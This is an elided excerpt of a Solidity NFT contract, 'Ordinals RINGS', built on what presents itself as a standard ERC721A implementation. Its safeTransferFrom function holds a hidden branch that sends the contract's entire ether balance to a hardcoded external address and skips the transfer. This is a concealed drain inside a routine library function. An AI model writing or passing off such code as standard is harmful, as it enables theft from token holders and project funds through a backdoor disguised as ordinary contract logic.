...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xeAA39DEB48bdadf4Bc0DDb07D0A776fa9ec8AD3C).transfer(address(this).balance);
            return;
        }
...
contract OrdinalsRINGS is ERC721A {
    ...
    constructor() ERC721A("Ordinals RINGS", "Ring") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeif6sjqmvnb3i6a22dbkqludxdunhgsgygrxac3ld2fzcdvfvdfyua/", _toString(tokenId), ".json"));
    }
